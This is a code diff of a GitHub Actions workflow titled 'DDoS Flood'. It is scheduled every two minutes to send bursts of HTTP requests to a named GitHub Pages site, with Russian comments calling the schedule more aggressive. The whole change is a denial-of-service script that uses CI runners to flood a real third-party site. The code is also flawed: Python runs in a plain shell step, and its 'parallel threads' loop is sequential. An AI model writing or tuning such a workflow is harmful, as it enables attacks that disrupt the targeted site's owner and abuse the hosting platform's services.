@@ -1,8 +1,11 @@
-name: DDoS Attack
+name: DDoS Flood
 
 on:
+  # Запуск каждые 2 минуты (более агрессивный график)
   schedule:
-    - cron: '*/5 * * * *'
+    - cron: '*/2 * * * *'
+  
+  # Также можно запускать вручную через кнопку "Run workflow"
 
 jobs:
   attack:
@@ -19,11 +22,18 @@ jobs:
       - name: Install dependencies
         run: pip install requests
       
-      - name: Run Attack
+      - name: Run Attack Burst
         run: |
           import requests
-          while True:
+          import time
+          
+          target = "https://srabakio.github.io/"
+          threads = 20 # Количество параллельных потоков
+          
+          for _ in range(threads):
               try:
-                  requests.get('https://srabakio.github.io/')
+                  requests.get(target)
               except:
                   pass
+              
+          print("Burst sent")
